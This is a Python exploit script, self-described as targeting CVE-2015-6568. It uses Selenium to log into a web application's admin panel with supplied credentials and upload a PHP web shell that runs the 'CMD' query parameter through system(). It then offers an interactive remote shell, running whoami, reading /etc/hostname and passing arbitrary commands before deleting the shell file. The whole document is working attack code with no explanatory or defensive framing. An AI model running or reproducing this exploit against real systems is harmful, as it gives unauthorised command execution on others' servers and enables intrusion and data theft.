from argparse import ArgumentParser, RawTextHelpFormatter
from huepy import *
import string
import random
from typing import List
import tempfile as tmp
import os.path as path
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.firefox.webdriver import WebDriver, FirefoxWebElement as WebElement
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
import selenium.webdriver.support.expected_conditions as EC
import requests as http

_F = "".join(random.choices(string.ascii_letters, k=13)) + ".php"
F = path.join(tmp.gettempdir(), _F)
with open(F, "w") as file:
    file.write("<?php system($_GET['CMD']); ?>")
    file.close()

parser = ArgumentParser(description="Exploit for CVE-2015-6568",
                        formatter_class=RawTextHelpFormatter)
parser.add_argument("--target",
                    "-t",
                    help="target uri where application is installed",
                    required=True,
                    metavar="",
                    dest="t")
parser.add_argument("--user",
                    "-u",
                    help="username to authenticate",
                    required=True,
                    metavar="",
                    dest="u")
parser.add_argument("--password",
                    "-p",
                    help="password to authenticate",
                    required=True,
                    metavar="",
                    dest="p")
parser.add_argument("--debug",
                    help="if passed, spawn the firefox window",
                    default=True,
                    action="store_false")
parser.add_argument("--timeout",
                    help="timeout in seconds (default: 1)",
                    dest="T",
                    metavar="",
                    default=1)
args = parser.parse_args()

if args.t.endswith("/"):
    args.t = args.t[:-1]

print(info("Logging in"))
opt = Options()
opt.headless = args.debug
driver: WebDriver = WebDriver(options=opt)
driver.maximize_window()

driver.get(args.t + "/?/admin/login")
driver.find_element_by_xpath("//input[@id='login-username']").send_keys(args.u)
driver.find_element_by_xpath("//input[@id='login-password']").send_keys(args.p)
driver.find_element_by_xpath(
    "//body/div[@id='dialog']/form[1]/div[5]/input[1]").click()
driver.implicitly_wait(1)
driver.switch_to.alert.accept()

try:
    WebDriverWait(driver, 60).until(
        EC.presence_of_element_located(
            (By.XPATH, "//a[contains(text(),'Files')]"))).click()
    print(good("Logged in"))
except TimeoutException:
    print(bad("Unable to login"))
    exit(1)

print(info("Uploading file to %s" % (args.t + "/public/" + _F)))
driver.find_element_by_xpath(
    "//body/div[@id='main']/div[@id='sidebar-wrapper']/div[@id='sidebar']/p[3]/a[1]"
).click()
driver.find_element_by_xpath("//input[@id='upload_file']").send_keys(F)
driver.find_element_by_xpath("//input[@id='upload_file_button']").click()
driver.implicitly_wait(1)
driver.switch_to.alert.accept()

try:
    WebDriverWait(driver, 15).until(
        EC.presence_of_element_located(
            (By.XPATH, "//a[contains(text(),'%s')]" % _F)))
    print(good("Spawing shell"))
    r = http.get(args.t + "/public/" + _F, params={"CMD": "whoami"})
    user = r.content.decode().strip()
    r = http.get(args.t + "/public/" + _F, params={"CMD": "cat /etc/hostname"})
    host = r.content.decode().strip()
    shell = f"{lightgreen('%s@%s'%(user, host))}{blue('$ ')}"
    while True:
        try:
            cmd = input(shell)
            if cmd == "exit": break
            r = http.get(args.t + "/public/" + _F, params={"CMD": cmd})
            if r.status_code == 404:
                print(bad("Shell not found"))
                break
            print(r.content.decode().strip())
        except:
            break

except TimeoutException:
    print(bad("Unable to upload file"))
    pass

print(info("Cleaning shell %s" % _F))
http.get(args.t + "/public/" + _F, params={"CMD": "rm -rf %s" % _F})
r = http.get(args.t + "/public/" + _F)
if r.status_code == 404:
    print(good("Deleted file %s" % _F))
else:
    print(bad("Unable to clear the file"))

if args.debug:
    driver.quit()
